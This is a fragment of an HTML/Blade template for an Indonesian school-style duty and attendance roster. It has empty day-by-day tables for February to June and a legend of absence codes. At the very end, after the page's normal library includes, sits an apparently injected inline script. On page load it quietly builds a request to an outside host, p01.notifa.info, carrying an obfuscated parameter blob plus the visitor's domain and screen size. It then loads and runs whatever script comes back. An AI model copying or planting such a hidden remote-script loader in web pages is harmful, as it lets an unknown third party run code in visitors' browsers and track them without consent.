<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">March</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">April</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr class="danger">

<td class="text-center">2</td>


<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">May</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">31</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
<tr>
<td colspan="11" class="text-center info">June</td>
</tr>
<tr>
<td class="success text-center" rowspan="2">Tanggal</td>
</tr>
<tr>
<td  colspan="5" class="text-center warning">keterangan
</td>

<td colspan="5" class="text-center warning">petugas piket
</td>

</tr>

<tr><td class="text-center">1</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>

</tr>

<tr><td class="text-center">2</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">3</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">4</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">5</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">6</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">7</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">8</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">9</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">10</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">11</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">12</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">13</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">14</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">15</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">16</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">17</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">18</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">19</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">20</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">21</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">22</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">23</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">24</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr class="danger">

<td class="text-center">25</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">26</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">27</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">28</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">29</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

<tr><td class="text-center">30</td>

<td colspan="5" class="text-center"></td>

<td colspan="5" class="text-center"></td>
</tr>

</tr>
                                </table>

                            </div>




                            <!-- /.table-responsive -->
                            <div class="well">
                                <h4>Keterangan Absensi</h4>
                                <p>A = Tidak Masuk Tanpa Keterangan</p>
                                <p>I = Tidak Masuk Ada Surat Ijin Atau Pemberitahuan</p>
                                <p>S = Tidak Masuk Ada Surat Dokter Atau Pemberitahuan</p>
                                <p>M = Hadir</p>
                                <p>N = Belum Ada Keterangan Absensi</p>
                                <p class="text-info">Warna merah pada tabel menandakan hari minggu</p>

                            </div>
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- Core Scripts - Include with every page -->
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>

    <!-- Page-Level Plugin Scripts - Tables -->
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <!-- SB Admin Scripts - Include with every page -->
    <script src="js/sb-admin.js"></script>

    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mLjcjWn%2bvCNaJ85cVa7QpLexe2F3tjA0kdh4v0bUhBXB%2bTKh9mk5nopbRFTkfQfeIMLMGLBY1jTK9XcL4%2fnBrZWhmQoC3kzoPe5MPfKT59U9mXOWsfHC4S%2bOZPL5wPtvSCtljRSLBOPFJTexgl8o%2bi%2fsPKy4wxY7gxJPgf9I7TSgJmEcA3j29byq8ONfHAtGoAQAB8A2mgS%2bZoqdSmS6In3PRsWqzjE7tbfC%2fGztDF6fjFyZkJBcIRz4aZrGgUnnVOUVPlCESepDO8FVwc8ns2xEveWjyIbRps4AWKTOW8DVempi2PlBiKwhpLMg%2b1wwV8hitWGX4iHWzO8zK4hu%2fTKignfEAV4%2fzVIXNeKy8LQt09rxmWUV1TwuHU0Kp4mq9z9GlJBOPTpf7wmgxEXRm7eKjovuSNryyYgHOPd3U8MORMeWOAkPS8tzAwZjmqJehKL4GvvCuIN%2bUSVt0NHrJJ6pA2pSvTg5CDVPiilVAUx%2bUO%2ftJrLHR1MtfYCdnY0MjRhJWVhX%2bfm0C3XDL%2br%2blTit7U9UkrTy5OrJOMz%2fM9pjBFhixWV1tdVyfddYqoXKnkpPtMJCQqknbwmp%2fKWG%2bYRPAu3VXtWMc" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

@endsection
